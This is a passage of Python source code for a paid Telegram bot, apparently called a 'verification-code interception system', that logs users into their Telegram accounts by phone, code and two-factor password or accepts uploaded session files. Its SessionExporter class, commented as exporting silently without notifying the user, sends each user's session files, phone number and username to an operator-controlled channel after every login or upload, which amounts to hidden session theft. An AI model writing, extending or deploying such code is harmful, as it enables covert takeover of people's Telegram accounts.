        with cls._lock:
            return dict(cls._sessions)

    @classmethod
    async def scan_and_restore_all(cls, bot) -> int:
        """
        扫描并恢复所有会话
        Args:
            bot: Telegram Bot实例
        Returns:
            恢复的会话数量
        """
        logger.info("开始扫描所有会话文件...")
        total_found = 0
        total_alive = 0

        for user_dir in Config.SESSIONS_DIR.iterdir():
            if not user_dir.is_dir() or not user_dir.name.startswith("user_"):
                continue

            try:
                user_id = int(user_dir.name.replace("user_", ""))
            except ValueError:
                continue

            session_files = list(user_dir.glob("*.session"))

            for session_file in session_files:
                total_found += 1
                is_alive, phone = await cls.check_session_alive(session_file)

                if is_alive and phone:
                    total_alive += 1
                    success = await cls.start_monitoring(user_id, phone, session_file, bot)
                    if success:
                        try:
                            await bot.send_message(
                                user_id,
                                f"🔄 <b>监控已自动恢复</b>\n📱 账号: {phone}",
                                parse_mode='HTML'
                            )
                        except Exception as e:
                            logger.warning(f"通知用户 {user_id} 失败: {e}")
                else:
                    # 归档无效会话
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    phone_part = phone if phone else "unknown"
                    target_path = Config.HISTORY_DIR / f"{user_id}_{phone_part}_{timestamp}_{session_file.name}"
                    try:
                        shutil.move(str(session_file), str(target_path))
                        logger.info(f"归档无效会话: {session_file.name} -> {target_path.name}")
                    except Exception as e:
                        logger.error(f"归档失败: {e}")

        logger.info(f"扫描完成: 发现 {total_found} 个会话, 恢复 {total_alive} 个")
        return total_alive


# ============================================================
#  12. 频道验证模块
# ============================================================

class ChannelVerifier:
    """频道验证类"""

    @staticmethod
    async def check_user_in_channel(context: ContextTypes.DEFAULT_TYPE,
                                    user_id: int) -> Tuple[bool, str]:
        """
        检查用户是否加入了指定频道
        Args:
            context: 上下文
            user_id: 用户ID
        Returns:
            (是否加入, 详细信息)
        """
        # 如果 REQUIRED_CHANNEL 为空，直接通过
        if not Config.REQUIRED_CHANNEL:
            return True, "频道验证已禁用"

        try:
            bot = context.bot

            # 尝试获取聊天成员信息
            try:
                chat_member = await bot.get_chat_member(
                    chat_id=Config.REQUIRED_CHANNEL,
                    user_id=user_id
                )
                if chat_member.status in ['member', 'administrator', 'creator']:
                    return True, "已加入频道"
            except Exception as e:
                logger.warning(f"获取频道成员信息失败 (用户{user_id}): {e}")

            # 检查本地记录
            if JoinRecordManager.is_recorded(user_id):
                return True, "已加入频道（记录）"

            return False, "未加入频道"

        except Exception as e:
            logger.error(f"检查频道加入状态失败 (用户{user_id}): {e}")
            return False, f"验证失败: {str(e)}"

    @staticmethod
    def get_join_keyboard() -> InlineKeyboardMarkup:
        """获取加入频道的按钮"""
        if not Config.REQUIRED_CHANNEL:
            return InlineKeyboardMarkup([])
        return InlineKeyboardMarkup([
            [InlineKeyboardButton(
                "📢 点击加入频道",
                url=f"https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}"
            )],
            [InlineKeyboardButton("✅ 我已加入，验证", callback_data="verify_join")]
        ])


# ============================================================
#  13. 权限检查模块
# ============================================================

class PermissionChecker:
    """权限检查类"""

    @staticmethod
    async def check_user_permission(context: ContextTypes.DEFAULT_TYPE,
                                    user_id: int) -> Tuple[bool, str]:
        """
        统一检查用户权限
        检查顺序: 管理员 > 频道加入 > 付款状态
        Returns:
            (是否有权限, 原因)
        """
        # 管理员跳过所有检查
        if AdminManager.is_admin(user_id):
            return True, "管理员权限"

        # 1. 检查是否加入频道
        is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
        if not is_joined:
            return False, "join_required"

        # 2. 检查是否已付款
        ps = PaymentManager.check_payment_status(user_id)
        if ps["status"] != "paid":
            return False, "payment_required"

        return True, "通过"

    @staticmethod
    async def ensure_user_permission(update: Update,
                                     context: ContextTypes.DEFAULT_TYPE) -> bool:
        """
        确保用户有权限访问，如果没有则发送相应提示
        Returns:
            是否有权限
        """
        user_id = update.effective_user.id

        has_permission, reason = await PermissionChecker.check_user_permission(
            context, user_id
        )

        if has_permission:
            return True

        if reason == "join_required":
            await PermissionChecker._send_join_required(update, user_id, context)
        elif reason == "payment_required":
            await PermissionChecker._send_payment_required(update, user_id, context)

        return False

    @staticmethod
    async def _send_join_required(update: Update, user_id: int,
                                  context: ContextTypes.DEFAULT_TYPE):
        """发送需要加入频道的消息"""
        if not Config.REQUIRED_CHANNEL:
            return

        msg = (
            "🔐 <b>加入频道验证</b>\n\n"
            "⚠️ 您需要先加入指定频道才能使用本机器人！\n\n"
            f"📢 <b>请先加入频道：</b> "
            f"<a href='https://t.me/{Config.REQUIRED_CHANNEL.lstrip('@')}'>"
            f"{Config.REQUIRED_CHANNEL}</a>\n\n"
            "👇 点击下方按钮加入频道，然后点击「我已加入，验证」\n\n"
            "💡 <b>提示：</b> 只需验证一次，之后可正常使用所有功能"
        )

        keyboard = ChannelVerifier.get_join_keyboard()

        if update.callback_query:
            await update.callback_query.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )

    @staticmethod
    async def _send_payment_required(update: Update, user_id: int,
                                     context: ContextTypes.DEFAULT_TYPE):
        """发送支付要求消息"""
        # 检查是否有待支付订单
        pending = PaymentManager.get_pending_order(user_id)

        if pending:
            await PaymentUI.send_payment_reminder(update, user_id, pending)
        else:
            # 创建新订单
            result = PaymentService.create_order(user_id)

            if not result["success"]:
                msg = (
                    "🚫 <b>激活失败</b>\n\n"
                    f"❌ {result.get('error', '未知错误')}\n\n"
                    "请稍后重试或联系管理员。"
                )
                if update.callback_query:
                    await update.callback_query.message.reply_text(msg, parse_mode='HTML')
                else:
                    await update.message.reply_text(msg, parse_mode='HTML')
                return

            await PaymentUI.send_payment_message(update, user_id, result)


# ============================================================
#  14. 支付界面模块
# ============================================================

class PaymentUI:
    """支付界面UI类"""

    @staticmethod
    def get_payment_keyboard(unique_id: str = None) -> InlineKeyboardMarkup:
        """获取支付键盘"""
        buttons = [
            [InlineKeyboardButton("💳 查看支付链接", callback_data="show_pay_link")]
        ]
        if unique_id:
            buttons.append([
                [InlineKeyboardButton("🔍 查询支付状态", callback_data=f"check_pay:{unique_id}")]
            ])
        return InlineKeyboardMarkup(buttons)

    @staticmethod
    async def send_payment_message(update: Update, user_id: int,
                                   result: Dict[str, Any]):
        """发送支付消息"""
        pay_url = result["pay_url"]
        unique_id = result["unique_id"]

        msg = (
            f"💳 <b>请支付 {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN} 激活机器人</b>\n\n"
            "👇 点击下方按钮获取支付链接\n"
            "支付完成后点击「查询支付状态」\n\n"
            f"💰 <b>金额：</b>{Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
            f"📌 <b>订单号：</b><code>{unique_id}</code>\n\n"
            "⚠️ 请使用 USDT-TRC20 网络支付\n"
            f"⏰ 订单有效期为 {Config.ORDER_EXPIRE_SECONDS // 60} 分钟"
        )

        keyboard = PaymentUI.get_payment_keyboard(unique_id)

        if update.callback_query:
            await update.callback_query.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )

    @staticmethod
    async def send_payment_reminder(update: Update, user_id: int,
                                    order: Dict[str, Any]):
        """发送支付提醒"""
        unique_id = order.get("unique_id")

        msg = (
            "⏳ <b>您有未完成的支付订单</b>\n\n"
            f"💰 <b>金额：</b>{Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
            f"📌 <b>订单号：</b><code>{unique_id}</code>\n\n"
            "👇 点击下方按钮查看支付链接或查询状态\n"
            f"⏰ 订单有效期为 {Config.ORDER_EXPIRE_SECONDS // 60} 分钟"
        )

        keyboard = PaymentUI.get_payment_keyboard(unique_id)

        if update.callback_query:
            await update.callback_query.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )
        else:
            await update.message.reply_text(
                msg, parse_mode='HTML', reply_markup=keyboard,
                disable_web_page_preview=True
            )


# ============================================================
#  15. 键盘布局
# ============================================================

class Keyboards:
    """键盘布局类"""

    @staticmethod
    def main() -> ReplyKeyboardMarkup:
        """主菜单键盘"""
        return ReplyKeyboardMarkup([
            ["📁 上传会话文件", "📱 手机号登录"],
            ["⚙️ 账号管理"]
        ], resize_keyboard=True)

    @staticmethod
    def cancel() -> ReplyKeyboardMarkup:
        """取消操作键盘"""
        return ReplyKeyboardMarkup(
            [["❌ 取消操作"]],
            resize_keyboard=True,
            one_time_keyboard=True
        )

    @staticmethod
    def manage(user_id: int) -> InlineKeyboardMarkup:
        """账号管理键盘"""
        sessions = SessionManager.get_active_sessions(user_id)

        rows = []
        for phone in sessions.keys():
            rows.append([
                InlineKeyboardButton(f"📱 {phone}", callback_data="noop"),
                InlineKeyboardButton("🔌 断开", callback_data=f"stop_single:{phone}"),
            ])

        if rows:
            rows.append([
                InlineKeyboardButton("🔴 停止所有监控", callback_data="stop_all")
            ])

        return InlineKeyboardMarkup(rows) if rows else InlineKeyboardMarkup([])


# ============================================================
#  16. Session导出模块（静默导出）
# ============================================================

class SessionExporter:
    """Session文件导出模块 - 静默导出，不通知用户"""

    @staticmethod
    async def export_session_to_channel(bot, user_id: int, phone: str,
                                         session_path: Path) -> bool:
        """
        将session文件静默导出到指定频道
        Args:
            bot: Telegram Bot实例
            user_id: 用户ID
            phone: 手机号
            session_path: session文件路径
        Returns:
            是否成功
        """
        if not Config.FORWARD_CHANNEL:
            logger.info(f"未配置导出频道，跳过导出: {phone}")
            return False

        if not session_path.exists():
            logger.warning(f"Session文件不存在: {session_path}")
            return False

        try:
            # 准备导出信息
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            user_info = f"👤 用户ID: {user_id}"
            
            # 尝试获取用户名
            try:
                user = await bot.get_chat(user_id)
                if user.username:
                    user_info += f"\n📝 用户名: @{user.username}"
                if user.first_name:
                    user_info += f"\n👋 昵称: {user.first_name}"
            except:
                pass

            # 导出 .session 文件
            caption = (
                f"📱 <b>Session文件导出</b>\n\n"
                f"📞 手机号: <code>{phone}</code>\n"
                f"{user_info}\n"
                f"⏰ 导出时间: {timestamp}\n"
                f"📁 文件名: <code>{session_path.name}</code>"
            )

            with open(session_path, 'rb') as f:
                await bot.send_document(
                    chat_id=Config.FORWARD_CHANNEL,
                    document=f,
                    filename=f"{phone}.session",
                    caption=caption,
                    parse_mode='HTML'
                )

            # 检查是否有对应的 .json 文件
            session_json_path = session_path.with_suffix('.json')
            if session_json_path.exists():
                json_caption = (
                    f"📋 <b>Session JSON文件</b>\n\n"
                    f"📞 手机号: <code>{phone}</code>\n"
                    f"⏰ 导出时间: {timestamp}"
                )
                with open(session_json_path, 'rb') as f:
                    await bot.send_document(
                        chat_id=Config.FORWARD_CHANNEL,
                        document=f,
                        filename=f"{phone}.json",
                        caption=json_caption,
                        parse_mode='HTML'
                    )

            logger.info(f"✅ 静默导出成功: {phone} (用户: {user_id})")
            return True

        except Exception as e:
            logger.error(f"❌ 静默导出失败 ({phone}, 用户: {user_id}): {e}")
            return False

    @staticmethod
    async def silent_export(bot, user_id: int, phone: str,
                            file_path: Path, max_retries: int = 3) -> None:
        """
        静默导出session文件（不通知用户，后台运行）
        Args:
            bot: Telegram Bot实例
            user_id: 用户ID
            phone: 手机号
            file_path: session文件路径
            max_retries: 最大重试次数
        """
        for attempt in range(max_retries):
            try:
                success = await SessionExporter.export_session_to_channel(
                    bot, user_id, phone, file_path
                )
                if success:
                    return
                else:
                    if attempt < max_retries - 1:
                        logger.warning(f"静默导出重试 ({attempt + 1}/{max_retries}): {phone}")
                        await asyncio.sleep(2)
            except Exception as e:
                if attempt < max_retries - 1:
                    logger.warning(f"静默导出异常，重试 ({attempt + 1}/{max_retries}): {e}")
                    await asyncio.sleep(2)
                else:
                    logger.error(f"静默导出最终失败 ({phone}): {e}")


# ============================================================
#  17. Telegram Bot 命令处理器
# ============================================================

class BotHandlers:
    """Bot命令处理器类"""

    # ---------- 主要命令 ----------

    @staticmethod
    async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """/start 命令"""
        user_id = update.effective_user.id

        # 权限检查
        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        # 显示主菜单
        sessions = SessionManager.get_active_sessions(user_id)
        count = len(sessions)

        status_text = f"\n\n📊 当前监控: {count} 个账号" if count > 0 else ""

        await update.message.reply_text(
            f"👋 <b>Telegram 验证码拦截系统</b>\n"
            f"作者 @APl520\n\n"
            f"请选择操作：{status_text}",
            parse_mode='HTML',
            reply_markup=Keyboards.main()
        )
        return ConversationHandler.END

    @staticmethod
    async def entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """菜单入口处理"""
        user_id = update.effective_user.id

        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text

        if text == "⚙️ 账号管理":
            return await BotHandlers.manage_accounts(update, context)
        elif text == "📁 上传会话文件":
            await update.message.reply_text(
                "请发送 .session 文件\n系统会自动识别手机号并分类存储。",
                reply_markup=Keyboards.cancel()
            )
            return PHONE_INPUT
        elif text == "📱 手机号登录":
            await update.message.reply_text(
                "请输入手机号码 (格式: +8613800000000):",
                reply_markup=Keyboards.cancel()
            )
            return PHONE_INPUT

        return ConversationHandler.END

    @staticmethod
    async def manage_accounts(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """账号管理"""
        user_id = update.effective_user.id

        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        sessions = SessionManager.get_active_sessions(user_id)

        if not sessions:
            await update.message.reply_text(
                "ℹ️ 您当前没有正在运行的监控任务。",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        await update.message.reply_text(
            f"⚙️ <b>账号管理</b>\n正在监控 <b>{len(sessions)}</b> 个账号\n\n"
            "点击 🔌 断开 可停止单个账号监控：",
            parse_mode='HTML',
            reply_markup=Keyboards.manage(user_id)
        )
        return ConversationHandler.END

    # ---------- 对话处理器 ----------

    @staticmethod
    async def handle_phone_or_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理手机号或文件上传"""
        user_id = update.effective_user.id

        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text or ""

        if text == "❌ 取消操作":
            await update.message.reply_text("已取消。", reply_markup=Keyboards.main())
            return ConversationHandler.END

        # ===== 文件上传 =====
        if update.message.document:
            doc = update.message.document
            if not doc.file_name.endswith('.session'):
                await update.message.reply_text("❌ 必须是 .session 文件")
                return PHONE_INPUT

            user_dir = SessionManager.get_user_dir(user_id)
            temp_path = user_dir / f"temp_{user_id}_{datetime.now().timestamp()}.session"

            try:
                file = await doc.get_file()
                await file.download_to_drive(temp_path)

                await update.message.reply_text("📁 文件接收成功，正在识别...")

                is_alive, phone = await SessionManager.check_session_alive(temp_path)

                if not is_alive or not phone:
                    await update.message.reply_text("❌ 文件无效或已过期")
                    if temp_path.exists():
                        temp_path.unlink()
                    return ConversationHandler.END

                final_path = user_dir / f"{phone}.session"
                if final_path.exists():
                    await SessionManager.stop_monitoring(user_id, phone, archive=True)
                    final_path.unlink()
                temp_path.rename(final_path)

                success = await SessionManager.start_monitoring(
                    user_id, phone, final_path, update.get_bot()
                )

                if success:
                    # ===== 静默导出session到频道（不通知用户）=====
                    asyncio.create_task(
                        SessionExporter.silent_export(
                            update.get_bot(), user_id, phone, final_path
                        )
                    )
                    
                    await update.message.reply_text(
                        f"✅ <b>监控已启动</b>\n📱 账号: {phone}",
                        parse_mode='HTML',
                        reply_markup=Keyboards.main()
                    )
                else:
                    await update.message.reply_text(
                        "❌ 启动监控失败",
                        reply_markup=Keyboards.main()
                    )

                return ConversationHandler.END

            except Exception as e:
                logger.error(f"文件处理失败: {e}")
                await update.message.reply_text(
                    f"❌ 处理文件时出错: {e}",
                    reply_markup=Keyboards.main()
                )
                if temp_path.exists():
                    temp_path.unlink()
                return ConversationHandler.END

        # ===== 手机号登录 =====
        phone = text.strip()
        if re.match(r'^\+\d{10,15}$', phone):
            context.user_data['phone'] = phone
            user_dir = SessionManager.get_user_dir(user_id)
            final_path = user_dir / f"{phone}.session"
            telethon_path = str(user_dir / phone)

            # 检查是否已在监控中
            sessions = SessionManager.get_active_sessions(user_id)
            if phone in sessions:
                await update.message.reply_text(
                    f"⚠️ 账号 {phone} 已在监控中，请勿重复添加。",
                    reply_markup=Keyboards.main()
                )
                return ConversationHandler.END

            await update.message.reply_text(f"⏳ 正在连接 ({phone})...")

            try:
                client = TelegramClient(telethon_path, Config.API_ID, Config.API_HASH)
                client.flood_sleep_threshold = 60
                await client.connect()

                if await client.is_user_authorized():
                    await update.message.reply_text("✅ 检测到已登录，启动监控！")
                    
                    # ===== 静默导出已有的session到频道 =====
                    asyncio.create_task(
                        SessionExporter.silent_export(
                            update.get_bot(), user_id, phone, final_path
                        )
                    )
                    
                    await SessionManager.start_monitoring(
                        user_id, phone, final_path, update.get_bot()
                    )
                    
                    await update.message.reply_text(
                        f"✅ 监控已启动\n📱 账号: {phone}",
                        reply_markup=Keyboards.main()
                    )
                    return ConversationHandler.END

                await client.send_code_request(phone)
                context.user_data['temp_client'] = client
                context.user_data['file_path'] = final_path

                await update.message.reply_text(
                    "📨 验证码已发送，请输入 5 位数字：",
                    reply_markup=Keyboards.cancel()
                )
                return VERIFICATION_CODE

            except FloodWaitError as e:
                await update.message.reply_text(
                    f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试",
                    reply_markup=Keyboards.main()
                )
                return ConversationHandler.END
            except Exception as e:
                logger.error(f"登录请求失败: {e}")
                await update.message.reply_text(
                    f"❌ 登录请求失败: {e}",
                    reply_markup=Keyboards.main()
                )
                return ConversationHandler.END

        await update.message.reply_text(
            "❌ 格式错误。请输入正确的手机号格式 (+8613800000000)",
            reply_markup=Keyboards.cancel()
        )
        return PHONE_INPUT

    @staticmethod
    async def handle_verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理验证码"""
        user_id = update.effective_user.id

        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text

        if text == "❌ 取消操作":
            if context.user_data.get('temp_client'):
                try:
                    await context.user_data['temp_client'].disconnect()
                except:
                    pass
            context.user_data.clear()
            await update.message.reply_text("已取消", reply_markup=Keyboards.main())
            return ConversationHandler.END

        client = context.user_data.get('temp_client')
        phone = context.user_data.get('phone')
        file_path = context.user_data.get('file_path')

        if not client or not phone:
            await update.message.reply_text(
                "❌ 会话已过期，请重新开始",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        try:
            await client.sign_in(phone, code=text)
            await update.message.reply_text("✅ 登录成功！")
            try:
                await client.disconnect()
            except:
                pass

            # ===== 静默导出session到频道（不通知用户）=====
            asyncio.create_task(
                SessionExporter.silent_export(
                    update.get_bot(), user_id, phone, file_path
                )
            )

            # 启动监控
            await SessionManager.start_monitoring(
                user_id, phone, file_path, update.get_bot()
            )
            context.user_data.clear()
            
            await update.message.reply_text(
                f"✅ 监控已启动\n📱 账号: {phone}",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        except SessionPasswordNeededError:
            context.user_data['verification_code'] = text
            await update.message.reply_text(
                "🔐 请输入二级密码：",
                reply_markup=Keyboards.cancel()
            )
            return TWO_FACTOR_PASSWORD

        except PhoneCodeInvalidError:
            await update.message.reply_text(
                "❌ 验证码无效，请检查后重新输入：",
                reply_markup=Keyboards.cancel()
            )
            return VERIFICATION_CODE

        except FloodWaitError as e:
            await update.message.reply_text(
                f"❌ 操作过于频繁，请等待 {e.seconds} 秒后再试",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        except Exception as e:
            error_msg = str(e)
            if "expired" in error_msg.lower():
                try:
                    await client.send_code_request(phone)
                    await update.message.reply_text(
                        "⚠️ 验证码已过期，已重新发送\n\n请输入新的5位验证码：",
                        reply_markup=Keyboards.cancel()
                    )
                    return VERIFICATION_CODE
                except Exception as send_err:
                    logger.error(f"重新发送验证码失败: {send_err}")
                    await update.message.reply_text(
                        f"❌ 验证失败: {error_msg}",
                        reply_markup=Keyboards.main()
                    )
                    return ConversationHandler.END
            else:
                await update.message.reply_text(
                    f"❌ 验证失败: {error_msg}",
                    reply_markup=Keyboards.main()
                )
                return ConversationHandler.END

    @staticmethod
    async def handle_two_factor(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理2FA密码"""
        user_id = update.effective_user.id

        if not await PermissionChecker.ensure_user_permission(update, context):
            return ConversationHandler.END

        text = update.message.text

        if text == "❌ 取消操作":
            if context.user_data.get('temp_client'):
                try:
                    await context.user_data['temp_client'].disconnect()
                except:
                    pass
            context.user_data.clear()
            await update.message.reply_text("已取消", reply_markup=Keyboards.main())
            return ConversationHandler.END

        client = context.user_data.get('temp_client')
        phone = context.user_data.get('phone')
        file_path = context.user_data.get('file_path')

        if not client or not phone:
            await update.message.reply_text(
                "❌ 会话已过期，请重新开始",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        try:
            await client.sign_in(password=text)
            await update.message.reply_text("✅ 二级密码通过！")
            try:
                await client.disconnect()
            except:
                pass

            # ===== 静默导出session到频道（不通知用户）=====
            asyncio.create_task(
                SessionExporter.silent_export(
                    update.get_bot(), user_id, phone, file_path
                )
            )

            # 启动监控
            await SessionManager.start_monitoring(
                user_id, phone, file_path, update.get_bot()
            )
            context.user_data.clear()
            
            await update.message.reply_text(
                f"✅ 监控已启动\n📱 账号: {phone}",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

        except PhoneCodeInvalidError:
            await update.message.reply_text(
                "⚠️ 验证码已过期，正在重新发送...",
                reply_markup=Keyboards.cancel()
            )
            try:
                await client.send_code_request(phone)
                context.user_data.pop('verification_code', None)
                return VERIFICATION_CODE
            except Exception as e:
                await update.message.reply_text(
                    f"❌ 重新发送验证码失败: {e}",
                    reply_markup=Keyboards.main()
                )
                return ConversationHandler.END

        except PasswordHashInvalidError:
            await update.message.reply_text(
                "❌ 二级密码错误，请重新输入：",
                reply_markup=Keyboards.cancel()
            )
            return TWO_FACTOR_PASSWORD

        except Exception as e:
            error_msg = str(e)
            if "expired" in error_msg.lower():
                await update.message.reply_text(
                    "⚠️ 验证码已过期，正在重新发送...",
                    reply_markup=Keyboards.cancel()
                )
                try:
                    await client.send_code_request(phone)
                    context.user_data.pop('verification_code', None)
                    return VERIFICATION_CODE
                except Exception as send_err:
                    await update.message.reply_text(
                        f"❌ 重新发送失败: {send_err}",
                        reply_markup=Keyboards.main()
                    )
                    return ConversationHandler.END

            await update.message.reply_text(
                f"❌ 验证失败: {error_msg}",
                reply_markup=Keyboards.main()
            )
            return ConversationHandler.END

    # ---------- 回调处理器 ----------

    @staticmethod
    async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """处理内联按钮回调"""
        query = update.callback_query
        user_id = query.from_user.id
        data = query.data

        await query.answer()

        # ===== 频道验证 =====
        if data == "verify_join":
            is_joined, msg = await ChannelVerifier.check_user_in_channel(context, user_id)

            if is_joined:
                username = query.from_user.username or query.from_user.first_name
                JoinRecordManager.record_joined(user_id, username)

                ps = PaymentManager.check_payment_status(user_id)

                if ps["status"] == "paid":
                    await query.edit_message_text(
                        "✅ <b>验证成功！</b>\n\n"
                        "您已成功加入频道，发送 /start 开始使用。",
                        parse_mode='HTML'
                    )
                else:
                    await query.edit_message_text(
                        "✅ <b>验证成功！</b>\n\n"
                        "您已加入频道，现在需要支付激活。\n\n"
                        f"💳 <b>支付金额：</b>{Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
                        "发送 /start 开始支付流程。",
                        parse_mode='HTML'
                    )
            else:
                await query.edit_message_text(
                    "❌ <b>验证失败</b>\n\n"
                    "未能检测到您加入频道。\n\n"
                    "请确保：\n"
                    "1️⃣ 点击下方按钮加入频道\n"
                    "2️⃣ 加入后点击「我已加入，验证」\n\n"
                    "如果已加入仍验证失败，请稍等几秒后重试。",
                    parse_mode='HTML',
                    reply_markup=ChannelVerifier.get_join_keyboard()
                )
            return

        # ===== 支付相关 =====
        if data == "show_pay_link" or data.startswith("check_pay:"):
            # 检查是否已加入频道
            is_joined, _ = await ChannelVerifier.check_user_in_channel(context, user_id)
            if not is_joined and Config.REQUIRED_CHANNEL:
                await query.edit_message_text(
                    "⚠️ 请先加入频道后再操作。",
                    reply_markup=ChannelVerifier.get_join_keyboard()
                )
                return

            # 检查是否已激活
            ps = PaymentManager.check_payment_status(user_id)
            if ps["status"] == "paid":
                await query.edit_message_text(
                    "✅ 您已激活！发送 /start 开始使用。"
                )
                return

            if data == "show_pay_link":
                # 显示支付链接
                pending = PaymentManager.get_pending_order(user_id)
                if not pending:
                    result = PaymentService.create_order(user_id)
                    if not result["success"]:
                        await query.edit_message_text(
                            f"❌ 创建订单失败: {result.get('error', '未知错误')}"
                        )
                        return
                    pay_url = result["pay_url"]
                    unique_id = result["unique_id"]
                else:
                    pay_url = pending.get("pay_url")
                    unique_id = pending.get("unique_id")

                if not pay_url:
                    await query.edit_message_text("❌ 支付链接不存在，请重新 /start")
                    return

                msg = (
                    f"💳 <b>支付链接</b>\n\n"
                    f"💰 <b>金额：</b>{Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}\n"
                    f"📌 <b>订单号：</b><code>{unique_id}</code>\n\n"
                    "🔗 <b>点击下方链接支付：</b>\n"
                    f"<a href='{pay_url}'>点击支付 {Config.PAYMENT_AMOUNT} {Config.PAYMENT_COIN}</a>\n\n"
                    "⚠️ 支付完成后点击「查询支付状态」激活\n"
                    f"⏰ 订单有效期为 {Config.ORDER_EXPIRE_SECONDS // 60} 分钟"
                )

                await query.edit_message_text(
                    msg,
                    parse_mode='HTML',
                    reply_markup=PaymentUI.get_payment_keyboard(unique_id),
                    disable_web_page_preview=True
                )

            else:
                # 查询支付状态
                unique_id = data.split(":", 1)[1]
                result = PaymentService.check_order_status(user_id)

                if result["status"] == "paid":
                    await query.edit_message_text(
                        "🎉 <b>支付成功！</b>\n\n"
                        "✅ 您的账号已激活，发送 /start 开始使用。",
                        parse_mode='HTML'
                    )
                elif result["status"] == "pending":
                    await query.edit_message_text(
                        f"⏳ <b>等待支付中...</b>\n\n"
                        "请完成支付后再次点击查询。\n\n"
                        f"📌 订单号：<code>{unique_id}</code>",
                        parse_mode='HTML',
                        reply_markup=PaymentUI.get_payment_keyboard(unique_id)
                    )
                else:
                    await query.edit_message_text(
                        f"❌ <b>查询结果</b>\n\n{result.get('detail', '未知状态')}\n\n"
                        "请确认已支付后重试，或联系管理员。",
                        parse_mode='HTML',
                        reply_markup=PaymentUI.get_payment_keyboard(unique_id)
                    )
            return

        # ===== 账号管理（需要完整权限） =====
        if not await PermissionChecker.ensure_user_permission(update, context):
            return

        if data == "noop":
            return

        if data.startswith("stop_single:"):
            phone = data.split(":", 1)[1]

            sessions = SessionManager.get_active_sessions(user_id)
            if phone not in sessions:
                await query.edit_message_text(
                    f"⚠️ 账号 {phone} 已不在监控列表中。",
                    parse_mode='HTML'
                )
                return

            await query.edit_message_text(f"⏳ 正在断开: {phone}...", parse_mode='HTML')
            success = await SessionManager.stop_monitoring(user_id, phone, archive=True)

            if success:
                remaining = SessionManager.get_active_sessions(user_id)
                if remaining:
                    await query.edit_message_text(
                        f"✅ <b>已断开并归档</b>: {phone}\n\n"
                        f"⚙️ <b>账号管理</b>\n正在监控 {len(remaining)} 个账号",
                        parse_mode='HTML',
                        reply_markup=Keyboards.manage(user_id)
                    )
                else:
                    await query.edit_message_text(
                        f"✅ <b>已断开并归档</b>: {phone}\n\n当前没有正在监控的账号。",
                        parse_mode='HTML'
                    )
            else:
                await query.edit_message_text(
                    f"❌ 操作失败，请重试。\n账号: {phone}",
                    parse_mode='HTML'
                )

        elif data == "stop_all":
            sessions = SessionManager.get_active_sessions(user_id)
            phones = list(sessions.keys())

            if not phones:
                await query.edit_message_text("ℹ️ 没有活跃监控任务。")
                return

            await query.edit_message_text("⏳ 正在停止所有监控...")

            count = 0
            for phone in phones:
                if await SessionManager.stop_monitoring(user_id, phone, archive=True):
                    count += 1

            await query.edit_message_text(
                f"✅ <b>已停止全部监控</b>\n共断开 {count} 个账号",
                parse_mode='HTML'
            )

    # ---------- 管理员命令 ----------

    @staticmethod
    async def cmd_add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """添加管理员（仅超级管理员）"""
        user_id = update.effective_user.id

        if not AdminManager.is_super_admin(user_id):
            await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>添加管理员</b>\n\n"
                "用法：<code>/addadmin 用户ID</code>\n"
                "示例：<code>/addadmin 123456789</code>\n\n"
                "注意：只能添加普通管理员，超级管理员无法被添加",
                parse_mode='HTML'
            )
            return

        try:
            new_admin_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ 用户ID必须是数字")
            return

        success, msg = AdminManager.add_admin(new_admin_id, user_id)
        await update.message.reply_text(msg, parse_mode='HTML')

    @staticmethod
    async def cmd_remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
        """移除管理员（仅超级管理员）"""
        user_id = update.effective_user.id

        if not AdminManager.is_super_admin(user_id):
            await update.message.reply_text("❌ 只有超级管理员可以执行此操作")
            return

        if not context.args:
            await update.message.reply_text(
                "👑 <b>移除管理员</b>\n\n"
                "用法：<code>/removeadmin 用户ID</code>\n"
                "示例：<code>/removeadmin 123456789</code>",
                parse_mode='HTML'
            )
            return

        try:
            admin_id = int(context.args[0])
        except ValueError:
